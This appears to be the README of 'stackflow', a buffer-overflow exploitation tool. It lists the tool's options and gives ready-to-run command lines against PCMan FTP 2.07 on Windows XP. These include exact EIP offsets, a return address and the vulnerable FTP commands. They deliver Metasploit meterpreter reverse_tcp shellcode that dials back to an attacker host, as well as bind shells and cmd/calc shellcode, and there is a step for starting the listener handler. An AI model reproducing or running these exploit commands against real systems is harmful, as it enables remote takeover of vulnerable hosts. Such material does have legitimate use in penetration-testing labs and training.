stackflow
=========

Universal stack-based buffer overfow exploitation tool


Usage
=========

usage: ./stackflow.py OPTIONS

	optional arguments:
	  -h, --help            show this help message and exit
	  -r RHOST, --rhost RHOST
	                        rhost
	  -p RPORT, --rport RPORT
	                        rport
	  -c CMDS, --cmds CMDS  commands to send to server before overflow
	  -v VULNCMD, --vulncmd VULNCMD
	                        vulnerable command
	  -o OFFSET, --offset OFFSET
	                        offset to EIP
	  -a RETURNADD, --returnadd RETURNADD
	                        return address
	  -n NOPS, --nops NOPS  number of NOPS \x90 to prepend
	  -m PAYLOAD, --payload PAYLOAD
	                        MSF payload
	  -i LHOST, --lhost LHOST
	                        lhost
	  -l LPORT, --lport LPORT
	                        lport
	  -f FUZZ, --fuzz FUZZ  Fuzz command with cyclic pattern
	  -t, --calc            Send calc.exe shellcode
	  -t1, --cmdprompt      Send cmd.exe shellcode
	  -d, --display         Display the exploit buffer
	  -w TIMEOUT, --timeout TIMEOUT
	                        Timeout for socket (Default: 5)
	  -e CFEXPORT, --cfexport CFEXPORT
	                        Export exploit config and handler rc file
	  -g CFIMPORT, --cfimport CFIMPORT
	                        Import exploit config from file

All options can be input via the command line.

Some examples for PCMan FTP 2.07 running on WindowsXP SP3(ENG):

Vulnerable app: http://www.exploit-db.com/wp-content/themes/exploit/applications/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z


exploit without any commands and send meterpreter/reverse_tcp shellcode dialing back to 192.168.0.2 on port 4444:

	./stackflow.py -i 192.168.0.2 -l 4444 -r 192.168.0.9 -p 21 -o 2012 -m windows/meterpreter/reverse_tcp -a 7E429353


exploit the USER command and send meterpreter/reverse_tcp shellcode dialing back to 192.168.0.2 on port 4444:

	./stackflow.py -i 192.168.0.2 -l 4444 -r 192.168.0.9 -p 21 -o 2007 -m windows/meterpreter/reverse_tcp -v 'USER' -a 7E429353


exploit the PASS command and send calc.exe shellcode:

	./stackflow.py -r 192.168.0.9 -p 21 -o 6103 -v 'PASS' -c 'USER anonymous' -a 7E429353 -t


exploit the ABOR command and send meterpreter/bind_tcp shellcode listening on 4444:

	./stackflow.py -r 192.168.0.9 -p 21 -o 2007 -v 'ABOR' -c 'USER anonymous&PASS a@a.com' -a 7E429353 -l 4444 -m windows/meterpreter/bind_tcp


exploit the CWD command and send cmd.exe shellcode and display the exploit buffer:

	./stackflow.py -r 192.168.0.9 -p 21 -o 2008 -v 'CWD' -c 'USER anonymous&PASS a@a.com' -a 7E429353 -t1 -d


fuzz the STOR command with a cyclic buffer of size 3000:

	./stackflow.py -r 192.168.0.9 -p 21 -v 'STOR' -c 'USER anonymous&PASS a@a.com' -f 3000


export the exploit config and handler rc file:

	./stackflow.py -r 192.168.0.9 -p 21 -o 2008 -v 'CWD' -c 'USER anonymous&PASS a@a.com' -a 7E429353 -t1 -e pcmancalcCWD


run an exploit from a config file:

	./stackflow -g pcmancalcCWD.py


start metasploit handler:

	msfconsole -r pcmancalcCWD.rc

